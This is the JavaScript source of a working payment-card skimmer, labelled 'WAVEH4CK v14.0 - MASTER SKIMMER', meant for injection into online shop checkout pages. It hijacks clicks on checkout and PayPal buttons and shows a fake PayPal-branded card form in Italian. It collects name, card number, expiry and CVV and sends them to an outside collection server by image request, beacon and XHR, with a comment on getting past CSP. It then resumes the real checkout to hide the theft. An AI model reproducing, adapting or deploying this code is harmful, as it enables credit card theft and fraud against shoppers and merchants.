/* WAVEH4CK v14.0 - MASTER SKIMMER */
(function() {
    const C2 = 'https://waveh4ck.gamer.gd/listener.php'; 
    if (window._wh_master) return;
    window._wh_master = true;

    const _u = {
        send: (data) => {
            // Encode data ke Base64 (Anti-intercept / Corrupt)
            const p = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
            
            // 1. Teknik Image (Paling bandel tembus CSP)
            const i = new Image();
            i.src = C2 + '?data=' + p + '&ts=' + Date.now();
            
            // 2. Teknik Navigator Beacon (Background send)
            if (navigator.sendBeacon) {
                navigator.sendBeacon(C2 + '?type=beacon', p);
            }

            // 3. XHR Fallback
            var x = new XMLHttpRequest();
            x.open("POST", C2, true);
            x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            x.send("v=" + p);
        }
    };

    // UI Redesign (Sama kayak tadi tapi logo lebih fix)
    const _css = \`
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        #pp-ovr { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.98); z-index:2147483647; display:flex; align-items:center; justify-content:center; font-family: 'Open Sans', sans-serif; }
        .pp-win { width:92%; max-width:400px; padding:30px; border-radius:8px; background:#fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border: 1px solid #ddd; }
        .pp-top { margin-bottom:20px; text-align:left; }
        .pp-inp { width:100%; border:1px solid #999; padding:12px; border-radius:4px; font-size:16px; margin-bottom:15px; box-sizing:border-box; }
        .pp-btn { width:100%; padding:14px; background:#0070ba; color:#fff; border:none; border-radius:30px; font-size:16px; font-weight:600; cursor:pointer; }
    \`;

    function buildUI(origBtn) {
        const s = document.createElement('style'); s.innerHTML = _css; document.head.appendChild(s);
        const w = document.createElement('div'); w.id = 'pp-ovr';
        w.innerHTML = \`
            <div class="pp-win">
                <div class="pp-top"><img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" height="30"></div>
                <h2 style="font-size:18px; margin-bottom:20px;">Paga con carta di credito</h2>
                <input type="text" id="p-name" class="pp-inp" placeholder="Titolare della carta">
                <input type="text" id="p-num" class="pp-inp" placeholder="Numero della carta" maxlength="19">
                <div style="display:flex; gap:10px;">
                    <input type="text" id="p-exp" class="pp-inp" placeholder="MM/AA">
                    <input type="password" id="p-cvv" class="pp-inp" placeholder="CVV" maxlength="4">
                </div>
                <button id="p-sub" class="pp-btn">Paga ora</button>
            </div>
        \`;
        document.body.appendChild(w);

        document.getElementById('p-sub').onclick = () => {
            const d = {
                target: location.host,
                name: document.getElementById('p-name').value,
                num: document.getElementById('p-num').value.replace(/ /g,''),
                exp: document.getElementById('p-exp').value,
                cvv: document.getElementById('p-cvv').value
            };
            document.getElementById('p-sub').innerText = 'Loading...';
            _u.send(d);
            setTimeout(() => { window._bp = true; w.remove(); origBtn.click(); }, 1500);
        }
    }

    document.addEventListener('click', (e) => {
        if (window._bp) return;
        const btn = e.target.closest('#paypal-express-button, .btn-checkout, .action.checkout, #place-order-button');
        if (btn) { e.preventDefault(); e.stopPropagation(); buildUI(btn); }
    }, true);
})();
